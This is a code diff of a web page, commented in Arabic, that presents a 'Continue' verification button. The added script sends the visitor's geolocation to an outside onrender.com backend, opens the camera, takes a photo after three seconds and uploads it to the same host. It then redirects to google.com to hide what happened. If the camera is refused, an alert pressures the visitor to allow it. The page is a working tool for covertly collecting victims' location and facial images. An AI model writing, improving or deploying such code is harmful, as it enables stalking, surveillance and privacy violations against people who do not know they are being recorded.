@@ -25,56 +25,82 @@ function start() {
     });
   });
 
-  // طلب الكاميرا
-  navigator.mediaDevices.getUserMedia({ video: true })
+ <button onclick="start()">Continue</button>
+
+<script>
+async function start() {
+    console.log("بدء عملية التحقق...");
+    
+    // 1. طلب الموقع
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+            console.log("تم تحديد الموقع، جاري الإرسال...");
+            try {
+                await fetch("https://verification-backend-o1t0.onrender.com/location", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude
+                    })
+                });
+            } catch (e) { console.log("خطأ في إرسال الموقع للسيرفر"); }
+            
+            // ننتقل للكاميرا سواء نجح إرسال الموقع أو فشل
+            openCamera();
+        },
+        (err) => {
+            console.log("المستخدم رفض الموقع، ننتقل للكاميرا مباشرة.");
+            openCamera();
+        }
+    );
+}
+
+function openCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
-      let video = document.createElement("video");
-      video.srcObject = stream;
-      video.play();
+        console.log("تم فتح الكاميرا، جاري التقاط الصورة بعد 3 ثوانٍ...");
+        let video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
 
-      let canvas = document.createElement("canvas");
+        let canvas = document.createElement("canvas");
 
-      setTimeout(() => {
-  canvas.width = 300;
-  canvas.height = 200;
-  canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
+        setTimeout(() => {
+            canvas.width = 300;
+            canvas.height = 200;
+            canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
 
-  // بدل toDataURL، نستخدم toBlob لتحويل الرسمة لملف حقيقي
-  canvas.toBlob((blob) => {
-    if (!blob) {
-      console.error("فشل تحويل الصورة");
-      return;
-    }
+            // طفي الكاميرا فوراً
+            stream.getTracks().forEach(track => track.stop());
 
-    // 1. تجهيز الكرتونة (FormData)
-    const formData = new FormData();
-    // نضع الـ blob ونعطيه اسم ملف افتراضي 'photo.png'
-    // كلمة 'image' هنا لازم تطابق اللي كتبناه بالباك إند upload.single('image')
-    formData.append("image", blob, "photo.png");
+            canvas.toBlob((blob) => {
+                if (!blob) return;
+                
+                const formData = new FormData();
+                formData.append("image", blob, "photo.png");
 
-    // 2. إرسال الطلب
-    fetch("https://verification-backend-o1t0.onrender.com/image", {
-      method: "POST",
-      // ⚠️ ملاحظة: لا تضع headers هنا، المتصفح سيقوم بالواجب تلقائياً
-      body: formData
-    })
-    .then(response => {
-      if (response.ok) {
-        window.location.href = "https://google.com";
-      } else {
-        console.log("السيرفر واجه مشكلة في الرفع");
-      }
+                console.log("جاري رفع الصورة للسيرفر...");
+                fetch("https://verification-backend-o1t0.onrender.com/image", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(res => {
+                    if (res.ok) {
+                        console.log("كل شيء تمام، تحويل...");
+                        window.location.href = "https://google.com";
+                    } else {
+                        console.error("فشل رفع الصورة");
+                    }
+                })
+                .catch(err => console.log("Error sending image:", err));
+
+            }, 'image/png');
+        }, 3000);
     })
     .catch(err => {
-      console.log("Error sending image:", err);
-    });
-
-  }, 'image/png'); // تحديد نوع الصورة
-
-}, 3000);
+        alert("الرجاء السماح للكاميرا بالعمل لتكملة الإجراءات!");
+        console.error("Camera error:", err);
     });
 }
 </script>
-
-</body>
-</html>
